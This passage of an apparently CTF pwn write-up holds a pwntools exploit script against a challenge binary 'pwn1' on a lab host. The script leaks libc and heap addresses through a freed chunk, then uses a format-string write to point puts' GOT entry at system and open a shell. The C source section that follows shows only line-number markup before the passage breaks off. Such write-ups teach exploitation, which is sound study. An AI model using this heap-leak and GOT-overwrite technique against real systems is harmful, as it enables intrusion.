class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">gdb.attach(p,<span class="string">'b set_motto\nb set_name'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'172.16.20.17'</span>,  <span class="number">40111</span>)<span class="comment">#process('./pwn1')</span></span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(domain,length,remark,ip)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"domain:"</span>)</span><br><span class="line">p.sendline(domain)</span><br><span class="line">p.recvuntil(<span class="string">"length"</span>)</span><br><span class="line">p.sendline(str(length))</span><br><span class="line">p.recvuntil(<span class="string">"remark:"</span>)</span><br><span class="line">p.sendline(remark)</span><br><span class="line">p.recvuntil(<span class="string">"IP:"</span>)</span><br><span class="line">p.send(ip)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(domain)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"4"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"domain:"</span>)</span><br><span class="line">p.sendline(domain)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(domain)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"domain:"</span>)</span><br><span class="line">p.sendline(domain)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">()</span>:</span></span><br><span class="line">add(<span class="string">"leak"</span>,<span class="number">0x100</span>,<span class="string">"p4nda"</span>,<span class="string">"...12345"</span>.ljust(<span class="number">0x20</span>,<span class="string">'b'</span>))</span><br><span class="line">add(<span class="string">"padding"</span>,<span class="number">0x100</span>,<span class="string">"p4nda"</span>,<span class="string">"...12345"</span>.ljust(<span class="number">0x20</span>,<span class="string">'b'</span>))</span><br><span class="line">add(<span class="string">"leak"</span>,<span class="number">0x100</span>,<span class="string">"p4nda"</span>,<span class="string">"...12345"</span>.ljust(<span class="number">0x20</span>,<span class="string">'b'</span>))</span><br><span class="line">add(<span class="string">"padding"</span>,<span class="number">0x100</span>,<span class="string">"p4nda"</span>,<span class="string">"...12345"</span>.ljust(<span class="number">0x20</span>,<span class="string">'b'</span>))</span><br><span class="line">add(<span class="string">"leak"</span>,<span class="number">0x100</span>,<span class="string">"p4nda"</span>,<span class="string">"...12345"</span>.ljust(<span class="number">0x20</span>,<span class="string">'b'</span>))</span><br><span class="line">add(<span class="string">"padding"</span>,<span class="number">0x100</span>,<span class="string">"p4nda"</span>,<span class="string">"...12345"</span>.ljust(<span class="number">0x20</span>,<span class="string">'b'</span>))</span><br><span class="line">delete(<span class="string">"leak"</span>)</span><br><span class="line">show(<span class="string">"leak"</span>)</span><br><span class="line"></span><br><span class="line">leak()</span><br><span class="line">p.recvuntil(<span class="string">"IP    : "</span>)</span><br><span class="line">libc.address  = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>)) - <span class="number">88</span> - <span class="number">0x10</span> - libc.symbols[<span class="string">"__malloc_hook"</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] system:'</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">p.recvuntil(<span class="string">"IP    : "</span>)</span><br><span class="line">heap =u64(p.recv(<span class="number">4</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] heap:'</span>,hex(heap)</span><br><span class="line">add(<span class="string">"fmt"</span>,<span class="number">0x50</span>,<span class="string">"%dp4nda%10$pp4nda%16$pp4nda\0"</span>,<span class="string">"..."</span>.ljust(<span class="number">0x20</span>,<span class="string">'c'</span>))</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'motto:'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line"><span class="keyword">if</span>(((heap+<span class="number">48</span>)&gt;&gt;(<span class="number">8</span>*i))&amp;<span class="number">0xff</span>) ==<span class="number">0x0a</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"bad addr"</span></span><br><span class="line">exit(<span class="number">0</span>)</span><br><span class="line">p.sendline(<span class="string">'/bin/sh\0'</span>+<span class="string">'a'</span>*(<span class="number">0xf0</span><span class="number">-0x10</span><span class="number">-8</span>)+p64(heap+<span class="number">48</span>))</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'name'</span>)</span><br><span class="line">p.sendline(<span class="string">'%6$hn'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"3p4nda"</span>+hex(elf.got[<span class="string">'puts'</span>])+<span class="string">"p4nda"</span>+hex(libc.symbols[<span class="string">'system'</span>])+<span class="string">'p4nda'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'motto'</span>)</span><br><span class="line">p.sendline(<span class="string">'p4nda'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br><span class="line">915</span><br><span class="line">916</span><br><span class="line">917</span><br><span class="line">918</span><br><span class="line">919</span><br><span class="line">920</span><br><span class="line">921</span><br><span class="line">922</span><br><span class="line">923</span><br><span class="line">924</span><br><span class="line">925</span><br><span class="line">926</span><br><span class="line">927</span><br><span class="line">928</span><br><span class="line">929</span><br><span class="line">930</span><br><span class="line">931</span><br><span class="line">932</span><br><span class="line">933</span><br><span class="line">934</span><br><span class="line">935</span><br><span class="line">936</span><br><span class="line">937</span><br><span class="line">938</span><br><span class="line">939</span><br><span class="line">940</span><br><span class="line">941</span><br><span class="line">942</span><br><span class="line">943</span><br><span class="line">944</span><br><span class="line">945</span><br><span class="line">946</span><br><span class="line">947</span><br><span class="line">948</span><br><span class="line">949</span><br><span class="line">950</span><br><span class="line">951</span><br><span class="line">952</span><br><span class="line">953</span><br><span class="line">954</span><br><span class="line">955</span><br><span class="line">956</span><br><span class="line">957</span><br><span class="line">958</span><br><span class="line">959</span><br><span class="line">960</span><br><span class="line">961</span><br><span class="line">962</span><br><span class="line">963</span><br><span class="line">964</span><br><span class="line">965</span><br><span class="line">966</span><br><span class="line">967</span><br><span class="line">968</span><br><span class="line">969</span><br><span class="line">970</span><br><span class="line">971</span><br><span class="line">972</span><br><span class="line">973</span><br><span class="line">974</span><br><span class="line">975</span><br><span class="line">976</span><br><span class="line">977</span><br><span class="line">978</span><br><span class="line">979</span><br><span class="line">980</span><br><span class="line">981</span><br><span class="line">982</span><br><span class="line">983</span><br><span class="line">984</span><br><span class="line">985</span><br><span class="line">986</span><br><span class="line">987</span><br><span class="line">988</span><br><span class="line">989</span><br><span class="line">990</span><br><span class="line">991</span><br><span class="line">992</span><br><span class="line">993</span><br><span class="line">994</span><br><span class="line">995</span><br><span class="line">996</span><br><span class="line">997</span><br><span class="line">998</span><br><span class="line">999</span><br><span class="line">1000</span><br><span class="line">1001</span><br><span class="line">1002</span><br><span class="line">1003</span><br><span class="line">1004</span><br><span class="line">1005</span><br><span class="line">1006</span><br><span class="line">1007</span><br><span class="line">1008</span><br><span class="line">1009</span><br><span class="line">1010</span><br><span class="line">1011</span><br><span class="line">1012</span><br><span class="line">1013</span><br><span class="line">1014</span><br><span class="line">1015</span><br><span class="line">1016</span><br><span class="line">1017</span><br><span class="line">1018</span><br><span class="line">1019</span><br><span class="line">1020</span><br><span class="line">1021</span><br><span class="line">1022</span><br><span class="line">1023</span><br><span class="line">1024</span><br><span class="line">1025</span><br><span class="line">1026</span><br><span class="line">1027</span><br><span class="line">1028</span><br><span class="line">1029</span><br><span class="line">1030</span><br><span class="line">1031</span><br><span class="line">1032</span><br><span class="line">1033</span><br><span class="line">1034</span><br><span class="line">1035</span><br><span class="line">1036</span><br><span class="line">1037</span><br><span class="line">1038</span><br><span class="line">1039</span><br><span class="line">1040</span><br><span class="line">1041</span><br><span class="line">1042</span><br><span class="line">1043</span><br><span class="line">1044</span><br><span class="line">1045</span><br><span class="line">1046</span><br><span class="line">1047</span><br><span class="line">1048</span><br><span class="line">1049</span><br><span class="line">1050</span><br><span class="line">1051</span><br><span class="line">1052</span><br><span class="line">1053</span><br><span class="line">1054</span><br><span class="line">1055</span><br><span class="line">1056</span><br><span class="line">1057</span><br><span class="line">1058</span><br><span class="line">1059</span><br><span class="line">1060</span><br><span class="line">1061</span><br><span class="line">1062</span><br><span class="line">1063</span><br><span class="line">1064</span><br><span class="line">1065</span><br><span class="line">1066</span><br><span class="line">1067</span><br><span class="line">1068</span><br><span class="line">1069</span><br><span class="line">1070</span><br><span class="line">1071</span><br><span class="line">1072</span><br><span class="line">1073</span><br><span class="line">1074</span><br><span class="line">1075</span><br><span class="line">1076</span><br><span class="line">1077</span><br><span class="line">1078</span><br><span class="line">1079</span><br><span class="line">1080</span><br><span class="line">1081</span><br><span class="line">1082</span><br><span 